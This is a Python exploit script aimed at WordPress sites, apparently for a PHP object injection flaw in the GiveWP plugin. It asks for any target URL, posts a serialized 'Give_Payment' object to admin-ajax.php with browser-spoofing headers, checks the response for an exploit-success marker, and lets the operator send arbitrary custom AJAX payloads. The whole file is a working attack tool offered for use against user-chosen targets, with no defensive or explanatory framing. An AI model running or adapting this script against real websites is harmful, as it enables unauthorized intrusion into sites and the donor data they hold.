import requests
import json

def display_payload_options():
    payloads = {
        '1': {
            'name': 'Check exploitability ',
            'action': 'give_ajax',
            'payload': {
                'give_title': 'O:12:"Give_Payment":1:{s:7:"give_id";s:36:"json_encode(array(\'Exploit\'=>\'Success\'))";}',  
            }
        },
        '2': {
            'name': 'Custom Payload',
            'action': None,
            'payload': None
        }
    }
    print("Select the type of payload you want to send:")
    for key, value in payloads.items():
        print(f"{key}: {value['name']}")
    return payloads

def get_user_payload(payloads):
    choice = input("Enter the number of the payload you want to use: ")
    if choice not in payloads:
        print("Invalid choice. Exiting.")
        return None, None
    if choice == '2':
        action = input("Enter the custom AJAX action: ")
        custom_payload = input("Enter your custom payload as JSON: ")
        try:
            payload = json.loads(custom_payload)
        except json.JSONDecodeError:
            print("Invalid JSON format. Exiting.")
            return None, None
        return action, payload
    else:
        return payloads[choice]['action'], payloads[choice]['payload']

def format_url(url):
    url = url.strip()
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "https://" + url
    if not url.endswith('/wp-admin/admin-ajax.php'):
        if url.endswith('/'):
            url = url + "wp-admin/admin-ajax.php"
        else:
            url = url + "/wp-admin/admin-ajax.php"
    return url

def main():
    url = input("Enter the target URL or domain (e.g., example.com): ")
    url = format_url(url)
    payloads = display_payload_options()
    action, payload = get_user_payload(payloads)
    if action is None or payload is None:
        return
    data = {
        'action': action,
    }
    data.update(payload)
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
        'Referer': url,
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': url
    }
    try:
        response = requests.post(url, data=data, headers=headers)
        print(f"HTTP Status Code: {response.status_code}")

        if response.status_code == 200:
            if 'Exploit' in response.text and 'Success' in response.text:
                print("Success: The exploit was triggered, and the confirmation message was received.")
            else:
                print("Failure: The response does not indicate that the exploit was successful.")
        else:
            print(f"Failure: The server responded with status code {response.status_code}, indicating the exploit might not have worked.")

    except requests.exceptions.RequestException as e:
        print("An error occurred while making the request:", str(e))

if __name__ == "__main__":
    main()
